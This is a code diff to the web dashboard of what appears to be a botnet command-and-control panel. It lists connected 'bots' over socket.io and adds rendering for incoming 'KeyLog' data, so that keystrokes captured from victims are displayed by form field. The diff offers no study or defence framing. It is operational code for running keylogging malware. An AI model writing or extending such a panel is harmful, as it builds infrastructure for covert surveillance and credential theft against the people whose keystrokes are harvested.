@@ -34,7 +34,6 @@
                             <div>
                                 <h1> Bot list </h1>
                                 <div id="bot-list" class="list-group">
-                                    <a href="#" data-id="" class="list-group-item">23423423</a>
                                     {{#each bots}}
                                     <a href="#" data-id="" class="list-group-item">{{@key}}</a>
                                     {{/each}}
@@ -79,8 +78,8 @@
                             </thead>
                             <tbody>
                                 <tr>
-                                    <th>ngdxpcexx</th>
-                                    <td>test back</td>
+                                    <th></th>
+                                    <td></td>
                                 </tr>
                             </tbody>
                         </table>
@@ -100,13 +99,26 @@
                 var socket = io();
                 // listen for bot-Join and add recieved {id: id} in the bot list
                 socket.on('bot-join',function(data){
-                    toastr.success('','Bot Joined: ' + data.id)
                     console.log('Bot Joined: ' + + data.id);
                     $('#bot-list').append('<a href="#" data-id="" class="list-group-item">' + data.id + '</a>')
                 });
                 socket.on('bot-data',function(data){
-                    toastr.success('','Recieved bot data : ' + data.id)
-                    console.log('Recieved bot data : ' , data.id);
+                    toastr.success('','Recieved bot data : ' + data.id);
+                    console.log(data)
+                    if(data.type == 'KeyLog'){
+                        var res = '';
+                        console.log('keys')
+                        res += '<div>';
+                        res = res + '<h4>' + 'Key Log Sections' + '</h4>';
+                        $.each(data.results,function(key,section){
+                            if (!section.keys) return;
+                            res = res + '<p>' + (section.field || '' ) + ':</p>';
+                            res = res + '<p>' + section.keys + '</p>';
+                        });
+                        res += '</div>';
+
+                        data.results = res;
+                    }
                     $('#bot-data-table tr:last').after(
                         $('<tr>').html(
                             [
